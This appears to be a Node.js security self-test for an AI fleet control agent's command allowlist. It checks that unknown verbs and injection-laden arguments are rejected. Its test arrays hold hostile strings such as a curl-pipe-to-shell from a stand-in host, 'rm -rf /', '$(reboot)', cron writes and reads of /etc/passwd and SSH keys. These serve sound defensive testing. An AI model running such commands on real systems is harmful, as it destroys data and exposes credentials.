#!/usr/bin/env node
// Fleet Mission Control — control-agent security self-test (offline, zero deps).
// Proves the allowlist closes the control plane and that hostile args cannot inject.
// Run:  node agent/test.mjs   (exit 0 = all passed)

import assert from "node:assert/strict";
import {
  validateCommand,
  isSafeRelPath,
  isSafeDirective,
  verbRequiresApproval,
  NAME_RE,
  RUN_REPOS,
  ALLOWED_VERBS,
} from "./allowlist.mjs";

let passed = 0;
function ok(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ok  ${name}`);
  } catch (e) {
    console.error(`FAIL  ${name}\n      ${e.message}`);
    process.exitCode = 1;
  }
}

// Convenience asserts on validateCommand's contract.
const allow = (verb, args) => {
  const r = validateCommand(verb, args);
  assert.equal(r.ok, true, `expected ALLOW for ${verb} ${JSON.stringify(args)} — got: ${r.reason}`);
  return r.argv;
};
const reject = (verb, args) => {
  const r = validateCommand(verb, args);
  assert.equal(r.ok, false, `expected REJECT for ${verb} ${JSON.stringify(args)} — but it was allowed: ${JSON.stringify(r.argv)}`);
};

console.log("Fleet control-agent security self-test\n");

// ── Allowlist is exactly the spec ─────────────────────────────────────────────
ok("allowlist is exactly the 8 spec verbs", () => {
  assert.deepEqual([...ALLOWED_VERBS].sort(), [
    "artifact", "check", "fetch-log", "morning", "nav", "pull", "run", "status",
  ]);
});

// ── requiresApproval flags: read verbs false, mutating verbs true ─────────────
ok("requiresApproval flags are correct", () => {
  for (const v of ["check", "status", "fetch-log", "pull", "artifact", "morning"]) {
    assert.equal(verbRequiresApproval(v), false, `${v} should NOT require approval`);
  }
  for (const v of ["nav", "run"]) {
    assert.equal(verbRequiresApproval(v), true, `${v} SHOULD require approval`);
  }
  assert.equal(verbRequiresApproval("nonsense"), false, "unknown verb is not approvable");
});

// ── Happy path: each verb maps to the exact cockpit.sh argv ────────────────────
ok("check -> [check]", () => assert.deepEqual(allow("check"), ["check"]));
ok("status -> [status]", () => assert.deepEqual(allow("status"), ["status"]));
ok("pull -> [pull]", () => assert.deepEqual(allow("pull"), ["pull"]));
ok("morning -> [morning]", () => assert.deepEqual(allow("morning"), ["morning"]));
ok("nav -> [nav]", () => assert.deepEqual(allow("nav"), ["nav"]));
ok("fetch-log{name:nav} -> [peek, nav]", () => assert.deepEqual(allow("fetch-log", { name: "nav" }), ["peek", "nav"]));
ok("fetch-log{name:claude-123456} -> [peek, claude-123456]", () =>
  assert.deepEqual(allow("fetch-log", { name: "claude-123456" }), ["peek", "claude-123456"]));
ok("artifact{relpath} -> [artifact, relpath]", () =>
  assert.deepEqual(allow("artifact", { relpath: "cellular-gaits/outputs/run.json" }), ["artifact", "cellular-gaits/outputs/run.json"]));
ok("artifact{relpath,dest} -> [artifact, relpath, dest]", () =>
  assert.deepEqual(allow("artifact", { relpath: "a/b.json", dest: "local/dir" }), ["artifact", "a/b.json", "local/dir"]));
ok("zero-arg verbs tolerate undefined/null/{}", () => {
  assert.deepEqual(allow("check", undefined), ["check"]);
  assert.deepEqual(allow("check", null), ["check"]);
  assert.deepEqual(allow("check", {}), ["check"]);
});

// ── Closed allowlist: unknown verbs rejected ──────────────────────────────────
ok("unknown verb rejected", () => reject("exec", { cmd: "rm -rf /" }));
ok("arbitrary-exec verb 'sh' rejected", () => reject("sh", {}));
ok("verb casing is exact (Check != check)", () => reject("Check", {}));
ok("empty / non-string verb rejected", () => {
  reject("", {});
  reject(null, {});
  reject(42, {});
});

// ── Zero-arg verbs reject any provided args ───────────────────────────────────
ok("check with args rejected", () => reject("check", { name: "nav" }));
ok("status with args rejected", () => reject("status", { x: 1 }));
ok("morning with args rejected", () => reject("morning", { x: 1 }));
ok("nav with args rejected", () => reject("nav", { repo: "portfolio" }));

// ── fetch-log: name charset whitelist ─────────────────────────────────────────
ok("fetch-log missing name rejected", () => reject("fetch-log", {}));
ok("fetch-log extra key rejected", () => reject("fetch-log", { name: "nav", evil: 1 }));
ok("fetch-log non-string name rejected", () => reject("fetch-log", { name: 123 }));
ok("fetch-log empty name rejected", () => reject("fetch-log", { name: "" }));

// ── INJECTION PROOFS: hostile args must be rejected, never reach the executor ──
// (Even though spawnSync(shell:false) already prevents the agent's own shell from
//  parsing these, cockpit.sh interpolates name/relpath into remote ssh strings, so
//  the charset whitelist is what stops downstream injection on the box.)
const HOSTILE_NAMES = [
  "nav; rm -rf ~",
  "nav && curl evil.sh | sh",
  "nav | tee /etc/passwd",
  "$(reboot)",
  "`reboot`",
  "nav\nrm -rf /",
  "nav $IFS rm",
  "nav > /etc/cron.d/x",
  "nav & sleep 1",
  "../../../../etc/passwd",
  "nav'; DROP TABLE x;--",
  'nav" ; id ; "',
  "*",
  "~root/.ssh",
];
for (const n of HOSTILE_NAMES) {
  ok(`fetch-log hostile name rejected: ${JSON.stringify(n)}`, () => reject("fetch-log", { name: n }));
}

// ── artifact: relpath/dest must be clean relative paths ───────────────────────
ok("artifact missing relpath rejected", () => reject("artifact", {}));
ok("artifact extra key rejected", () => reject("artifact", { relpath: "a", zzz: 1 }));
ok("artifact absolute path rejected", () => reject("artifact", { relpath: "/etc/passwd" }));
ok("artifact home-expansion rejected", () => reject("artifact", { relpath: "~/.ssh/id_rsa" }));
ok("artifact traversal rejected", () => reject("artifact", { relpath: "../../secret" }));
ok("artifact embedded traversal rejected", () => reject("artifact", { relpath: "a/../../b" }));
ok("artifact trailing/double slash rejected", () => {
  reject("artifact", { relpath: "a//b" });
  reject("artifact", { relpath: "a/b/" });
});
const HOSTILE_PATHS = [
  "a; rm -rf /",
  "a $(id)",
  "a`id`",
  "a b",            // space
  "a|b",
  "a&b",
  "a\nb",
  "a*b",
  "a?b",
  "a>b",
];
for (const p of HOSTILE_PATHS) {
  ok(`artifact hostile relpath rejected: ${JSON.stringify(p)}`, () => reject("artifact", { relpath: p }));
  ok(`artifact hostile dest rejected: ${JSON.stringify(p)}`, () => reject("artifact", { relpath: "ok/path", dest: p }));
}

// ── run: repo must be in the fixed set; directive capped + no control chars ────
ok("run valid -> [run-b64, repo, base64(directive)]", () => {
  const directive = `tidy the README; add a "Quick start" section & note: 100% done`;
  const argv = allow("run", { repo: "cellular-gaits", directive });
  assert.equal(argv[0], "run-b64");
  assert.equal(argv[1], "cellular-gaits");
  // argv[2] is base64 that round-trips back to the exact directive (zero-loss over ssh/tmux).
  assert.equal(Buffer.from(argv[2], "base64").toString("utf-8"), directive);
});
ok("run accepts both repos in the fixed set", () => {
  for (const repo of RUN_REPOS) {
    assert.deepEqual(allow("run", { repo, directive: "go" })[1], repo);
  }
  assert.deepEqual([...RUN_REPOS].sort(), ["cellular-gaits", "portfolio"]);
});
ok("run rejects a repo outside the fixed set", () => {
  reject("run", { repo: "evil", directive: "go" });
  reject("run", { repo: "../portfolio", directive: "go" });
  reject("run", { repo: "", directive: "go" });
  reject("run", { repo: 42, directive: "go" });
});
ok("run rejects missing/empty directive", () => {
  reject("run", { repo: "portfolio" });
  reject("run", { repo: "portfolio", directive: "" });
  reject("run", { repo: "portfolio", directive: 123 });
});
ok("run rejects an over-long directive (>2000 chars)", () => {
  reject("run", { repo: "portfolio", directive: "a".repeat(2001) });
  allow("run", { repo: "portfolio", directive: "a".repeat(2000) }); // exactly at cap = ok
});
ok("run rejects control chars / newlines / NULs in directive", () => {
  reject("run", { repo: "portfolio", directive: "line1\nline2" });
  reject("run", { repo: "portfolio", directive: "tab\there" });
  reject("run", { repo: "portfolio", directive: "carriage\rreturn" });
  reject("run", { repo: "portfolio", directive: "nul\0byte" });
  reject("run", { repo: "portfolio", directive: "bell\x07" });
  reject("run", { repo: "portfolio", directive: "del\x7f" });
});
ok("run rejects extra arg keys", () => reject("run", { repo: "portfolio", directive: "go", evil: 1 }));
// The directive needs NO restrictive charset (it's base64'd) — shell metachars are fine as DATA.
ok("run allows shell metacharacters in the directive (they are base64'd, never a shell string)", () => {
  const directive = `rm -rf / ; $(reboot) && \`id\` | tee /etc/passwd "quotes" 'apostrophes'`;
  const argv = allow("run", { repo: "portfolio", directive });
  assert.equal(Buffer.from(argv[2], "base64").toString("utf-8"), directive);
});

ok("isSafeDirective behaves", () => {
  assert.ok(isSafeDirective("plain goal"));
  assert.ok(isSafeDirective("a".repeat(2000)));
  assert.ok(!isSafeDirective("a".repeat(2001)));
  assert.ok(!isSafeDirective(""));
  assert.ok(!isSafeDirective("has\nnewline"));
  assert.ok(!isSafeDirective("has\0nul"));
  assert.ok(!isSafeDirective(123));
});

// ── Direct unit checks on the validators ──────────────────────────────────────
ok("NAME_RE accepts good, rejects bad", () => {
  assert.ok(NAME_RE.test("nav"));
  assert.ok(NAME_RE.test("claude-123456"));
  assert.ok(!NAME_RE.test("a b"));
  assert.ok(!NAME_RE.test("a;b"));
  assert.ok(!NAME_RE.test("a".repeat(65)));
});
ok("isSafeRelPath behaves", () => {
  assert.ok(isSafeRelPath("a/b/c.json"));
  assert.ok(!isSafeRelPath("/abs"));
  assert.ok(!isSafeRelPath("../x"));
  assert.ok(!isSafeRelPath("a/../b"));
  assert.ok(!isSafeRelPath(""));
  assert.ok(!isSafeRelPath("a b"));
});

console.log(`\n${passed} checks passed${process.exitCode ? " — WITH FAILURES" : ""}`);
